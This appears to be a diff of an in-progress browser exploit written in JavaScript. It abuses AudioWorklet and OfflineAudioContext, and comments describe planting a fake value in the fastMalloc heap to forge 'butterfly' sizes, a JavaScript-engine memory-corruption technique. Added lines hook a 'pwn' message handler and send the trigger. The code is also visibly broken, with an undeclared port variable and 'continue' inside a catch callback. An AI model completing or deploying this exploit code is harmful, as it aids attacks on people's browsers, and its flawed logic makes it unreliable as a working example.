@@ -2,12 +2,13 @@
 alert("Starting");
 let audioContext = new AudioContext();
 var offctx = new OfflineAudioContext(1,128,300000);
-offctx.audioWorklet.addModule(URL.createObjectURL(new Blob(['
-print("debug1");
+offctx.audioWorklet.addModule(URL.createObjectURL(new Blob([`
+ez = "starting123";
 registerProcessor("a", class {
         constructor() {
           // setup a message port to the main thread
           port = new AudioWorkletProcessor().port;
+          port.onmessage = pwn;
           // this part is magic
           // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
           eval('1 + 0x1336');
@@ -22,17 +23,21 @@ registerProcessor("b", class {
         }
       });
 
-'],{type:'text/javascript'}))).then(async () => {
+`],{type:'text/javascript'}))).then(async () => {
 var node1 = new AudioWorkletNode(audioContext, 'a');
 var node2 = new AudioWorkletNode(audioContext, 'b');
         node1.port.onmessage = (e) => {
                 alert(e.data);
         }
+        await new Promise((res) => setTimeout(res, 100))
+        node1.port.postMessage("pwn");
         let print = (msg) => { //Hoping this work around works as alert() seems to be undefined in the context of new Blob[] why?
                 //I honestly dont know maybe its like eval but in the context of thread running... or maybe it got something to do 
                 //With the fact Blob() takes a type of the language to be set in this sense it's 'text/javascript'
                 node1.port.postMessage(msg);
         }
         print("testing") //test it here
-});
+}).catch((ez) => {
+alert(ez);
+continue;});
 </script>
